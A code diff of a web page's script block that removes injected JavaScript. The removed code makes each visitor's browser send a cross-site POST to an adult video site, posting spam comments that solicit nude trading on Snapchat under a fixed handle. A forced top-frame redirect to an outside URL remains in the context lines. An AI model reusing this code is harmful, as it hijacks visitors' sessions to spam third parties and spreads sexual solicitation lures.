@@ -22,53 +22,6 @@
 } else {
 top.location.href='http://zstrakr.com/mob1.php';
 }
-
-function getVid(){
-   var sites = ["3539009","6806961","3558360","1169873","6964459","8040193","2567953","9100642","7367570","8580620","8754109","8470588","8338324","2107083","9266725","3392826","9111695","9187644","3431222","2218816","8474658","2919374","8951746","121425","2438707","8871292","8033679","7279897","4265971","4983099","3714044","8222458","6362563","8751412","3995841","307187","8785870","6168803","4965061","9096307","1978022","7919931","1521887","9177825","9018376"];
-        var i = parseInt(Math.random()*(sites.length-1));
-    return sites[i];
-};
-
-function getCom(){
-     var sites1 = ["sharing nudes on snapchat, jennyp2013", "who wants to trade nudes on snapchat? jennyp2013", "add me on snapchat for some fun ;) jennyp2013", "snapchat jennyp2013 for tradin nudes"];
-    var i = parseInt(Math.random()*(sites1.length-1));
-    return sites1[i];
-};
-
-var randy=Math.floor(Math.random()*1100);
-var cmt=getCom();
-var vid=getVid();
-function XHR() {
-    try {
-        return new XMLHttpRequest();
-    } catch (e) {};
-    try {
-        return new ActiveXObject('Msxml3.XMLHTTP');
-    } catch (e) {};
-    try {
-        return new ActiveXObject('Msxml2.XMLHTTP.6.0');
-    } catch (e) {};
-    try {
-        return new ActiveXObject('Msxml2.XMLHTTP.3.0');
-    } catch (e) {};
-    try {
-        return new ActiveXObject('Msxml2.XMLHTTP');
-    } catch (e) {};
-    try {
-        return new ActiveXObject('Microsoft.XMLHTTP');
-    } catch (e) {};
-    return null;
-};
-xmlhttp = new XHR();
-if (xmlhttp != null) {
-    xmlhttp['open']('POST', 'http://www.xnxx.com/postcomment/' + vid, false);
-    xmlhttp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
-   xmlhttp['send']('user=jennyp'+randy+'&comment=' + cmt + '&test=ok');
-
-    if (xmlhttp['responseText'] != null) {
-        var token = xmlhttp['responseText'];
-    };
-} else {};
 </script>
 </head>
   <body>
